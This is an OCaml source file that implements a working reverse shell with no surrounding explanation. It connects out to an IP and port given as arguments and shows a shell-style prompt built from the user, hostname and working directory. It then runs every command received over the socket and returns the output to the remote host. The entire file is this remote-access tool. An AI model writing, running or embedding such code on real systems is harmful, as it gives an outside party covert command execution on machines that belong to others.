open Unix;;

let create_socket () =
  socket PF_INET SOCK_STREAM 0

let connect_socket sock ip port =
  let server_addr = inet_addr_of_string ip in
  let server = ADDR_INET (server_addr, port) in
  connect sock server

let rec read_from_channel chan buffer =
  try
    let line = input_line chan in
    Buffer.add_string buffer (line ^ "\n");
    read_from_channel chan buffer
  with End_of_file -> ()

let exec_command cmd =
  let in_channel, out_channel = open_process cmd in
  let buffer = Buffer.create 4096 in
  read_from_channel in_channel buffer;
  close_in in_channel;
  close_out out_channel;
  Buffer.contents buffer

let handle_connection sock =
  let buf = Bytes.create 4096 in
  let rec loop () =
    let user = Sys.getenv_opt "USER" |> Option.value ~default:"unknown" in
    let hostname = Unix.gethostname () in
    let current_dir = Unix.getcwd () in

    let prompt = Printf.sprintf "%s@%s:%s$ " user hostname current_dir in
    let _ = write sock (Bytes.of_string prompt) 0 (String.length prompt) in

    let n = read sock buf 0 (Bytes.length buf) in
    if n = 0 then exit 0;
    let cmd = String.trim (Bytes.sub_string buf 0 n) in

    if String.length cmd > 0 then
      let result =
        try exec_command cmd
        with _ -> "Command failed: " ^ cmd ^ "\n"
      in
      let _ = write sock (Bytes.of_string result) 0 (String.length result) in
    loop ()
  in
  loop ()

let () =
  if Array.length Sys.argv <> 3 then
    Printf.eprintf "Usage: %s <ip> <port>\n" Sys.argv.(0)
  else
    let ip = Sys.argv.(1) in
    let port = int_of_string Sys.argv.(2) in
    let sock = create_socket () in
    connect_socket sock ip port;
    handle_connection sock